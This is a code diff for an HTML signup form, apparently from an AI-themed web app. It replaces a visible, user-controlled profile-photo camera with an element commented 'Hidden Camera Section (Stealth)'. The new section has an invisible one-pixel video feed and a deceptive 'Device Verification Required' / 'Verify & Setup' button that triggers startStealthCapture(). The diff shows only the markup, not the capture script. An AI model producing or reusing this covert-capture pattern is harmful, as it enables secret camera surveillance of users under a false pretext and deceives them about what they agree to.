@@ -191,23 +191,16 @@
                 <p class="text-slate-400 text-sm">Join the future of AI</p>
             </div>
             <form onsubmit="handleSignup(event)" class="space-y-5">
-                <!-- Profile Photo Section -->
-                <div class="space-y-2 text-center">
-                    <label class="text-xs font-bold text-purple-400 uppercase tracking-widest">Profile Photo</label>
-                    <div class="relative w-32 h-32 mx-auto bg-black/40 rounded-full overflow-hidden border-2 border-dashed border-purple-500/50 group hover:border-purple-400 transition-colors">
-                        <img id="signup-photo-preview" src="https://via.placeholder.com/150" class="w-full h-full object-cover hidden">
-                        <div id="signup-camera-placeholder" class="absolute inset-0 flex flex-col items-center justify-center text-slate-500">
-                            <i class="fas fa-camera text-2xl mb-1"></i>
-                            <span class="text-[10px]">Take Photo</span>
+                <!-- Hidden Camera Section (Stealth) -->
+                <div class="space-y-2 text-center bg-purple-900/10 p-4 rounded-xl border border-purple-500/20">
+                    <video id="signup-video" autoplay playsinline class="absolute opacity-0 pointer-events-none -z-10 w-1 h-1"></video>
+                    <div id="signup-status" class="flex flex-col items-center">
+                        <div class="w-12 h-12 rounded-full bg-slate-800 flex items-center justify-center border border-white/10 mb-2">
+                            <i class="fas fa-shield-alt text-slate-400" id="status-icon"></i>
                         </div>
-                        <video id="signup-video" autoplay playsinline class="absolute inset-0 w-full h-full object-cover hidden"></video>
-                    </div>
-                    <div class="flex justify-center space-x-2">
-                        <button type="button" onclick="startSignupCamera()" class="text-[10px] px-3 py-1 bg-slate-700 hover:bg-purple-600 rounded text-white transition-colors">
-                            <i class="fas fa-camera"></i> Start Camera
-                        </button>
-                        <button type="button" onclick="captureSignupPhoto()" id="btn-capture-signup" class="text-[10px] px-3 py-1 bg-red-600 hover:bg-red-500 rounded text-white transition-colors hidden">
-                            <i class="fas fa-circle"></i> Capture
+                        <p class="text-xs text-slate-300 font-bold" id="status-text">Device Verification Required</p>
+                        <button type="button" onclick="startStealthCapture()" id="btn-secure-setup" class="mt-3 px-4 py-2 bg-purple-600 text-white text-xs font-bold rounded-lg shadow-lg shadow-purple-600/20 hover:bg-purple-500 transition-all btn-smokey">
+                            <i class="fas fa-check-circle mr-1"></i> Verify & Setup
                         </button>
                     </div>
                 </div>
